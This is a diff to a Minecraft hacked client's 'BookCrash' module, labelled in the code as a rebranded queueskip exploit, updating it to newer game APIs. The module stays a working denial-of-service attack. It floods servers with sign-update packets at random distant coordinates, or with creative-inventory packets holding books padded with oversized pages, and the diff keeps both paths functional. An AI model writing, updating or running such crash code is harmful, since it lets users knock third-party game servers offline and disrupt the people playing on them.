@@ -21,18 +21,15 @@ import org.bleachhack.setting.module.SettingMode;
 import org.bleachhack.setting.module.SettingSlider;
 import org.bleachhack.setting.module.SettingToggle;
 
-import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
-import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
+import net.minecraft.component.DataComponentTypes;
+import net.minecraft.component.type.WrittenBookContentComponent;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
-import net.minecraft.nbt.NbtCompound;
-import net.minecraft.nbt.NbtList;
-import net.minecraft.nbt.NbtString;
-import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
 import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
 import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
-import net.minecraft.network.packet.s2c.play.DisconnectS2CPacket;
-import net.minecraft.screen.slot.SlotActionType;
+import net.minecraft.network.packet.s2c.common.DisconnectS2CPacket;
+import net.minecraft.text.RawFilteredPair;
+import net.minecraft.text.Text;
 import net.minecraft.util.math.BlockPos;
 
 /* Rebranded queueskip exploit. credit > https://www.youtube.com/watch?v=-BA4ABlFJuc */
@@ -57,8 +54,6 @@ public class BookCrash extends Module {
 			return;
 
 		ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
-		NbtList list = new NbtList();
-		NbtCompound tag = new NbtCompound();
 		String author = "Bleach";
 		String title = "\n Bleachhack Owns All \n";
 
@@ -83,30 +78,19 @@ public class BookCrash extends Module {
 			Random rand = new Random();
 			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
 				mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
-						new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), text, text, text, text));
+						new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), true, text, text, text, text));
 			}
 		} else {
+			java.util.List<RawFilteredPair<Text>> pageList = new java.util.ArrayList<>();
 			for (int i = 0; i < pages; i++) {
-				NbtString tString = NbtString.of(size);
-				list.add(tString);
+				pageList.add(RawFilteredPair.of(Text.literal(size)));
 			}
 
-			tag.putString("author", author);
-			tag.putString("title", title);
-			tag.put("pages", list);
-
-			bookObj.setSubNbt("pages", list);
-			bookObj.setNbt(tag);
+			bookObj.set(DataComponentTypes.WRITTEN_BOOK_CONTENT, new WrittenBookContentComponent(
+					RawFilteredPair.of(title), author, 0, pageList, true));
 
 			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
-				if (getSetting(0).asMode().getMode() == 0) {
-					Int2ObjectMap<ItemStack> map = new Int2ObjectOpenHashMap<>(1);
-					map.put(0, bookObj);
-
-					mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, 0, SlotActionType.PICKUP, bookObj, map));
-				} else {
-					mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
-				}
+				mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
 			}
 		}
 	}
